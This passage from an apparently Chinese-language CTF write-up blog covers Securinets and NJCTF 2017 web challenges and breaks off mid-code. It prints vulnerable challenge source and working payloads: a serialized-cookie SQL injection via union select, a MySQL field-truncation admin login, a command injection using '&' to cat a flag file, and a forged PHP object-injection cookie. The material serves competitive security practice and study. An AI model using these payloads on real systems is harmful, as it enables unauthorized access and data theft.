class="string">'QUERY_STRING'</span>]));</span><br><span class="line"><span class="keyword">if</span> (!is_dir($cond[<span class="number">1</span>])) <span class="keyword">echo</span> <span class="string">'folder does not exist.'</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $directory = <span class="keyword">new</span> DirectoryIterator($directory);</span><br><span class="line">    <span class="keyword">foreach</span>($directory <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;!--"</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/txt$/i"</span>, $file-&gt;getFilename())) <span class="keyword">echo</span> $file-&gt;getFilename();</span><br><span class="line">        <span class="keyword">else</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"--&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个好像挺有意思的，不过不知道怎么做，有知道的大佬请告诉我</p><h2 id="Securinets-Web"><a href="#Securinets-Web" class="headerlink" title="Securinets - Web"></a><a href="https://www.ctfsecurinets.com/" target="_blank" rel="external">Securinets</a> - Web</h2><h3 id="Web6-300-pts"><a href="#Web6-300-pts" class="headerlink" title="Web6 - 300 pts"></a>Web6 - 300 pts</h3><p>有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $db);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($id,$uname,$pass,$key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=htmlspecialchars($id);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=htmlspecialchars($uname);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass=htmlspecialchars($pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=htmlspecialchars($key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$msg=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) || <span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $uname=mysqli_real_escape_string($conn,$_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $pass=md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $user = unserialize($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uname=$user-&gt;name;</span><br><span class="line">        $pass=$user-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT id, username, pass,userkey FROM user where username = '"</span>.$uname.<span class="string">"' AND pass='"</span>.$pass.<span class="string">"'"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($row = $result-&gt;fetch_assoc())</span><br><span class="line">    &#123;</span><br><span class="line">        $user = <span class="keyword">new</span> User($row[<span class="string">'id'</span>],$row[<span class="string">'username'</span>],$row[<span class="string">'pass'</span>],$row[<span class="string">'userkey'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'remember'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!setcookie(<span class="string">"user"</span>,serialize($user)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;div class='alert alert-warning' style='font-size:20px;'&gt;You will need to activate cookies on your browser for this task!&lt;/div&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            setcookie(<span class="string">"user"</span>,<span class="string">""</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(md5($user-&gt;key)==<span class="string">'0e192156527884742253757578831994'</span>)</span><br><span class="line">            $msg= <span class="string">"&lt;div class='alert alert-success' style='font-size:20px;'&gt;$FLAG&lt;/div&gt;"</span>;</span><br><span class="line">        <span class="keyword">else</span> $msg= <span class="string">"&lt;div class='alert alert-warning' style='font-size:20px;'&gt;Valid credentials but you don't have the right key, sorry!&lt;/div&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> $msg= <span class="string">"&lt;div class='alert alert-danger' style='font-size:20px;'&gt;Login failed&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Login page&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;link href=<span class="string">"css/app.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt;</span><br><span class="line">      &lt;div class="container"&gt;</span><br><span class="line">        &lt;div class="navbar-header"&gt;</span><br><span class="line">          &lt;a class="navbar-brand" href="#"&gt;&lt;img style="height: 100%; margin-top: -3px; margin-right: 5px;" src="img/logo.png"&gt;WEB 5  &lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div id="navbar" class="collapse navbar-collapse"&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;&lt;!--/.nav-collapse --&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h1&gt; Login &lt;/h1&gt;</span><br><span class="line">         &lt;div class="container" &gt;</span><br><span class="line">    &lt;div class="col-md-6" &gt;</span><br><span class="line">        &lt;div id=<span class="string">"logbox"</span> &gt;</span><br><span class="line">        &lt;form name="login" class=" navbar-center" action="" method="post"&gt;</span><br><span class="line">        &lt;div class="input-group"&gt;</span><br><span class="line">            &lt;input type="text" name="username" class="form-control" placeholder="User Name"/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type="password" name="password" class="form-control" placeholder="Password"/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"remember"</span> /&gt; &lt;b&gt;Remember me.&lt;/b&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;br&gt; &lt;br&gt;</span><br><span class="line">            &lt;div class="input-group"&gt;</span><br><span class="line">            &lt;input type="submit" class="btn btn-primary" value="login"/&gt;</span><br><span class="line">            &lt;input type="reset" class="btn btn-primary" value="Cancel"/&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>分析下可以得到 flag 获取的条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">能够查询到登录用户</span><br><span class="line">用户的 key 值 == &apos;0e192156527884742253757578831994&apos;</span><br></pre></td></tr></table></figure><p>0e 开头的其他部分全为数字的 md5 值我们应该很熟悉了，猜测应该是联合查询 union select 一个用户，使得其 md5 值相等就可以了。然后看下登录部分，可以看到有两种方式可以登录，第一种是通过用户名和密码，但是用户名经过了 mysqli_real_escape_string 函数，密码又被 md5 了，不存在注入，第二种方式是通过 cookie，然后反序列化来登录，我们可以看到反序列化出来的用户名和密码是没有经过任何处理的，所以这里存在注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($id,$uname,$pass,$key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=htmlspecialchars($id);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=htmlspecialchars($uname);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass=htmlspecialchars($pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=htmlspecialchars($key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="keyword">new</span> User(<span class="string">'1'</span>, <span class="string">'a5s4d54'</span>, <span class="string">"use' union select 1,'user1','user1','240610708'#"</span>, <span class="string">'240610708'</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode((serialize($user)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>把输出的值放在 cookie 里就可以了<br>中间遇到一个坑，因为是否输入用户名是通过 isset 函数来检测的，当你提交过一次的时候再刷新，虽然没有输入任何数据，但是在请求主体中是以空字符串提交的，这种情况下 isset 会判断为真(我一般都用 isset 和 empty 共同验证)，不使用 cookie，造成了起初修改 cookie 一直不成功</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上周末出去浪了一天多。等回来时发现有三个比赛，看题目时便都快结束了，挑着几道还可以的做了下，有些太脑洞直接跳过了 = = &lt;/p&gt;
&lt;h2 id=&quot;VolgaCTF-Web&quot;&gt;&lt;a href=&quot;#VolgaCTF-Web&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="CTF,writeup" scheme="http://heartsky.info/tags/CTF-writeup/"/>
    
  </entry>
  
  <entry>
    <title>NJCTF 2017 writeup</title>
    <link href="http://heartsky.info/2017/03/15/NJCTF-2017-writeup/"/>
    <id>http://heartsky.info/2017/03/15/NJCTF-2017-writeup/</id>
    <published>2017-03-14T17:58:40.000Z</published>
    <updated>2018-10-26T06:08:42.427Z</updated>
    
    <content type="html"><![CDATA[<p>NJCTF - XCTF联赛南京站<br>这次比赛 web 题好多啊 - -</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login-100"><a href="#Login-100" class="headerlink" title="Login - 100"></a>Login - 100</h3><blockquote><p>login?<br><a href="http://218.2.197.235:23731/" target="_blank" rel="external">http://218.2.197.235:23731/</a></p></blockquote><p><del>弱口令</del><br>利用的数据库字段的长度限制，注册一个 admin+很多空格+hs 的用户，登录时用 admin 及注册时的密码就可以成功登录拿到 flag<br>放个本地 MySQL 的演示就明白了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users(username char(10),password char(10));</span><br><span class="line">Query OK, 0 rows affected (0.11 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUES('admin','secret');</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO users VALUES('admin               1','123456');</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+<span class="comment">----------+----------+</span></span><br><span class="line">| username | password |</span><br><span class="line">+<span class="comment">----------+----------+</span></span><br><span class="line">| admin    | secret   |</span><br><span class="line">| admin    | 123456   |</span><br><span class="line">+<span class="comment">----------+----------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p><p>所以 admin 用户是有很多密码的，其中有人登录时用的弱口令，所以出现了最初的情形，不过既然注册时有密码必须包含字母、数字、特殊字符的限制，为什么 admin123 还会登录成功？</p><h3 id="Get-Flag-100"><a href="#Get-Flag-100" class="headerlink" title="Get Flag - 100"></a>Get Flag - 100</h3><blockquote><p>别BB，来拿FLAG<br>PS:delay 5s<br><a href="http://218.2.197.235:23725/" target="_blank" rel="external">http://218.2.197.235:23725/</a></p></blockquote><p>有一个输入框，输入后会执行 cat 命令，返回一张图片，base64 解密后便可以得到命令的返回值，过滤了很多关键字和符号，包括 <code>;</code> 、<code>` </code> ，但是 <code>&amp;</code> 没有被过滤，这样我们就能执行任意的命令了，最后 flag 在根目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 &amp; cat ../../9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</span><br><span class="line">NJCTF&#123;Simp13_Pyth0n_C0de_Inj3cti0n_a77ack&#125;cat: images/1: No such file or directory</span><br></pre></td></tr></table></figure></p><p>后来拖源码时才发现 images 目录下有个 flag.txt 放着假的 flag  233</p><h3 id="Text-wall-350"><a href="#Text-wall-350" class="headerlink" title="Text wall - 350"></a>Text wall - 350</h3><p>…<br><a href="https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/" target="_blank" rel="external">https://losfuzzys.github.io/writeup/2016/10/02/tumctf-web50/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">new</span> filelist();</span><br><span class="line">$foo-&gt;source = <span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">$bar = [];</span><br><span class="line">$bar[] = $foo;</span><br><span class="line"></span><br><span class="line">$m = serialize($bar);</span><br><span class="line">$h = sha1($m);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode($h.$m);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取 index.php 拿到源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//The flag is /var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g</span></span></span><br><span class="line"><span class="php">$lists = [];</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'lists'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $cookie = $_COOKIE[<span class="string">'lists'</span>];</span></span><br><span class="line"><span class="php">    $hash = substr($cookie, <span class="number">0</span>, <span class="number">40</span>);</span></span><br><span class="line"><span class="php">    $sha1 = substr($cookie, <span class="number">40</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(sha1($sha1) === $hash)&#123;</span></span><br><span class="line"><span class="php">        $lists = unserialize($sha1);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'hiehiehie'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $info = $_POST[<span class="string">'hiehiehie'</span>];</span></span><br><span class="line"><span class="php">    $lists[] = $info;</span></span><br><span class="line"><span class="php">    $sha1 = serialize($lists);</span></span><br><span class="line"><span class="php">    $hash = sha1($sha1);</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'lists'</span>, $hash.$sha1);</span></span><br><span class="line"><span class="php">    header(<span class="string">'Location: '</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Please Get Flag!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"jumbotron"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Please Get Flag!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($lists <span class="keyword">as</span> $info):<span class="meta">?&gt;</span></span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$info<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"hiehiehie"</span> <span class="attr">value</span>=<span class="string">"hiehiehie"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再去读 flag 文件，得到 flag<br>NJCTF{PHP_un5erialization_a77ack_i5_very_Interes71ng}</p><h3 id="Guess-100"><a href="#Guess-100" class="headerlink" title="Guess - 100"></a>Guess - 100</h3><blockquote><p>Being Tired? ctfer? Here is an easy one for Old Drivers and Meng Xins, everyone knows how to solve it!<br><a href="http://218.2.197.235:23735/" target="_blank" rel="external">http://218.2.197.235:23735/</a></p></blockquote><p>是一个上传图片的站，有文件包含，读到了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,<span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,<span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,<span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span 